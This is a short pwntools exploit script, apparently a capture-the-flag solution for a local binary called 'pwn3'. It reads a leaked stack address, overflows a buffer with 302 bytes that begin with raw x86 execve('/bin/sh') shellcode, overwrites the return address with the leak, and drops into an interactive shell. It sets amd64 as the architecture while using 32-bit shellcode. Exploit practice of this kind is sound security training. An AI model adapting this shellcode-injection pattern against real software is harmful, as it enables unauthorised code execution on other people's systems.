from pwn import *

context.terminal = ["wezterm", "start", "--"]
context.update(arch="amd64")
context.log_level = "debug"

p = process(b"./pwn3")
# gdb.attach(p, api=True)

p.recvuntil(b"journey")
leak = p.recvline().strip()[:-1]
info(f"leak is: {leak}")

# x86 shellcode borrowed from: https://shell-storm.org/shellcode/files/shellcode-811.html
shell = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
payload = shell
payload += b"B" * (302 - len(payload))
payload += p32(int(leak, 16))
p.sendline(payload)

p.interactive()
